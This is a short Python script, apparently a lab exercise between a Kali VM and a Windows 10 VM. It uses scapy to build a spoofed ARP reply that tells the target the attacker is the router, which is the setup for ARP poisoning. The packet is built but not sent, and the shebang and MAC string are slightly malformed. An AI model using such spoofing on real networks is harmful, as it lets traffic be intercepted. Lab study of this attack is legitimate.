#/usr/bin/env python
from scapy.layers.l2 import ARP

# From Kali Linux VM to a Windows10 VM
# Create an ARP Response. Fields:
# "op" = 2 (ARP Response. Default 1 is Request)). "pdst" = [IP ADDRESS TARGET]. "hwdst" = [TARGET_MAC_ADDRESS].
# "psrc" = [SOURCE IP] - Tells target the source is the router.
# **route -n** returns the IP of the router (default gateway).
packet = ARP(op=2, pdst="192.168.63.174", hwdst=" 00-50-56-e8-00-20", psrc="192.168.63.2" )